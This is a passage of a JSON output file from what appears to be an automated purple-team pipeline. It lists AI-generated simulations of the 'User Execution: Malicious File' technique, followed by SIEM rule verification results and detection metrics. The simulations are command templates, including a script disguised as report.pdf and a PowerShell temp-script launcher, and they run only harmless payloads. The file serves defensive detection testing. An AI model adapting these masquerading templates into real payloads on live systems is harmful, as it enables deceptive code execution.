      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\_tmp' -ErrorAction SilentlyContinue; $content = 'Start-Process calc.exe'; $path = '%TEMP%\\_tmp\\run.ps1'; Set-Content -Path $path -Value $content -Force; Invoke-Item $path\"",
      "description": "Advanced: Creates a PowerShell script in temp, writes a benign execution command, and opens it with default handler (user interaction simulation).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a directory and a PowerShell script that launches calc.exe, then opens the script file (simulating user double-click). Calculator should open if script is run.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:50:08.803165",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "c9cf00bd-759a-444f-b844-a881a8a3c9e9",
      "ttp_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo -e '#!/bin/bash\\necho \\\"Malicious payload executed\\\"' > /tmp/malicious.sh && chmod +x /tmp/malicious.sh && /tmp/malicious.sh",
      "description": "Creates a simple bash script in /tmp, marks it executable, and runs it, simulating a user executing a malicious file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The script outputs the text 'Malicious payload executed' to the console.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.691672",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "91236376-f3f8-43f4-b268-ef658c06d1f5",
      "ttp_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "linux",
      "command": "cp /bin/true $HOME/malicious && chmod +x $HOME/malicious && $HOME/malicious",
      "description": "Copies a benign binary to the user's home directory, makes it executable, and runs it, representing execution of a malicious binary placed by an attacker.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The copied binary (which does nothing and exits with status 0) runs silently, confirming execution of the file.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.691672",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "f2c14a48-6f2b-4691-b301-151d5a09785e",
      "ttp_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "linux",
      "command": "printf '#!/bin/bash\\necho \\\"Executed disguised script\\\"\\n' > /tmp/report.pdf && chmod +x /tmp/report.pdf && /tmp/report.pdf",
      "description": "Creates a bash script disguised as a PDF file, makes it executable, and runs it, mimicking a user executing a malicious file that appears legitimate.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The script prints 'Executed disguised script' to the console, demonstrating execution of a file with a misleading extension.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:56:20.691672",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.621,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "984eebfc-2cce-480a-bc38-9515deeb5d58",
      "ttp_id": "T1204",
      "detected": true,
      "events_found": 192,
      "query_time_ms": 707.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "a3bd5be4-8de6-4bc4-a53d-c2c397e7ad09",
      "ttp_id": "T1566",
      "detected": true,
      "events_found": 46,
      "query_time_ms": 504.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b5fc4f09-b3dc-454c-8c43-93086f07e25c",
      "ttp_id": "T1059",
      "detected": true,
      "events_found": 74,
      "query_time_ms": 1290.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "536c7062-8d61-4499-8ffa-983bc9465809",
      "ttp_id": "T1027",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 579.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "7c73f0d6-3f9a-493b-93d2-883be74e4ca9",
      "ttp_id": "T1567",
      "detected": true,
      "events_found": 171,
      "query_time_ms": 495.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b03f4d51-fef5-46ae-b9b4-1fe402d06118",
      "ttp_id": "T1497",
      "detected": true,
      "events_found": 189,
      "query_time_ms": 470.00000000000006,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "4e413756-35e2-4873-af78-1ffb63d50903",
      "ttp_id": "T1071",
      "detected": true,
      "events_found": 4,
      "query_time_ms": 590.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b16d0e70-53dd-4c05-bf10-cb504c2cbd2d",
      "ttp_id": "T1041",
      "detected": true,
      "events_found": 4,
      "query_time_ms": 511.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "d356320c-1c00-4b67-9857-1e3339b7f335",
      "ttp_id": "T1050",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 752.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "cf96e0c9-7f76-4fdd-9cf2-a4fce804b5ec",
      "ttp_id": "T1060",
      "detected": true,
      "events_found": 189,
      "query_time_ms": 607.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "70fd23ea-bd88-493f-9335-a81b0fbc0d33",
      "ttp_id": "T1112",
      "detected": true,
      "events_found": 164,
      "query_time_ms": 493.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ddf9df58-cb36-45f8-8f3c-a23308de5394",
      "ttp_id": "T1005",
      "detected": true,
      "events_found": 4,
      "query_time_ms": 502.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "30392c89-a976-4aa0-8c2c-131914cf74b1",
      "ttp_id": "T1047",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 609.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "fea3be36-d027-4149-a278-221b76400c2d",
      "ttp_id": "T1560",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 565.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "92c6b8f7-a835-481a-86e9-ec5252505ee7",
      "ttp_id": "T1053",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 613.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "87fd021d-26e1-47ef-9086-064d71610d08",
      "ttp_id": "T1113",
      "detected": true,
      "events_found": 4,
      "query_time_ms": 652.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c13458a2-6c56-4513-9779-49ff57358404",
      "ttp_id": "T1204.002",
      "detected": true,
      "events_found": 208,
      "query_time_ms": 494.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    }
  ],
  "siem_metrics": {
    "true_positives": 12,
    "false_positives": 0,
    "false_negatives": 5,
    "precision": 1.0,
    "detection_rate": 0.7058823529411765,
    "f1_score": 0.8275862068965517
  },
  "iterations": 1,
  "final_score": 0.5632352941176472,
  "final_report": {
    "total_ttps": 24,
    "optimized_ttps": 17,
    "generated_rules": 17,
    "generated_attacks": 83,
    "timestamp": "2025-12-29T21:06:16.478693"
  },
  "timestamp": "2025-12-29T21:06:16.479764",
  "benchmark_metrics": {
    "duration_s": 1211.6560742855072,
    "quality_score": 0.6647182849043233
  }
}